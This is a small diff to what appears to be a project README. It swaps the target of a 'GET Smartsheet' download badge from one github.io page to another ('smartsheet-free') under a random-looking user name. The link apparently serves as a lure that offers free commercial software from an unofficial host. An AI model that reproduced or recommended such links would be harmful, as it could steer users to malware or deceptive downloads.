@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://1000logos.net/wp-content/uploads/2024/02/Smartsheet-logo.jpg)
 
-[![GET Smartsheet](https://img.shields.io/badge/GET%20%E2%80%94%20Smartsheet-0078D6?style=for-the-badge&logoColor=white)](https://westynsharprdzi.github.io/.github/smartsheet-review)
+[![GET Smartsheet](https://img.shields.io/badge/GET%20%E2%80%94%20Smartsheet-0078D6?style=for-the-badge&logoColor=white)](https://dustinphelpsizuu.github.io/.github/smartsheet-free)
 
 ---
 
